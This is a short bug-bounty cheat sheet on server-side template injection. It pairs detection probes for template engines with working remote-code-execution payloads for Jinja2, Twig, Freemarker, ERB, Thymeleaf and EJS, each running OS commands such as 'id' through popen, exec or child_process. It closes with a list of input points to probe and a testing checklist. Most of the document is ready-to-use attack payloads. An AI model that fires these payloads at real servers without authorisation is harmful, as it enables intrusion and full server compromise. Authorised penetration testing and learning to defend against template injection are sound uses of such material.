# SSTI — Server-Side Template Injection

> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

## Detection Payloads (Try All)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Mako
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (not Twig)
```

## RCE Payloads by Engine

### Jinja2 (Python/Flask/Django)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### Twig (PHP/Symfony)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Freemarker (Java)
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### ERB (Ruby on Rails)
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

### Spring Thymeleaf
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

### EJS (Node.js)
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

## Where to Test
```
Name/bio/username fields, email templates, invoice/PDF generators,
URL path parameters reflected in page, error messages, search query reflections,
HTTP headers that appear in rendered responses, notification templates
```

## Testing Checklist
```
[ ] Test all 6 detection payloads on every input
[ ] Identify template engine from positive result
[ ] Use engine-specific RCE payload
[ ] Test in: body params, URL params, headers, JSON fields
[ ] Check PDF/email generation endpoints
```